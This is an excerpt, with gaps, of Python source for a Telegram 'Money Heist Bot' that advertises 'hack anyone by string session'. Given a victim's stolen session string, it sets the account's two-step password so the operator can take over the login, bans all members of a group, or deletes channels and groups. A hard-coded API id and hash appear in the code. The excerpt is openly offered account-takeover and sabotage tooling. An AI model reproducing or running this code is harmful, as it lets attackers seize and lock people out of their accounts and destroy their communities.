...
async def user2fa(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X.edit_2fa("PROFESSOR IS BEST")
            return True
        except:
            return False
...
Agora will add more features Later 😅
"""
mm = """
**I Am Giving U Full Power Of Mine.Now U Can Hack Anyone By String Session. Use /hack\n Only My Owner Can Acces This Command.If U want to Use Then Deploy Money Heist Bot**
"""
...
async def start(event):
    ...
    async with tgbot.conversation(event.chat_id) as x:
        ...
        if res.text == "A":
            ...
            await event.reply("Banning all members. Thanks For using Money Heist Bot")
        elif r == "D":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            ...
            await event.reply(
                "Deleted the Channel/Group Thanks For using Money Heist Bot.\n/hack"
            )
        elif r == "H":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            ...
            if i:
                await event.reply(
                    "User don't have two step thats why now two step is `Money Heist Bot Is best` you can login now\n\nThanks For using Money Heist Bot.\n/hack"
                )
            else:
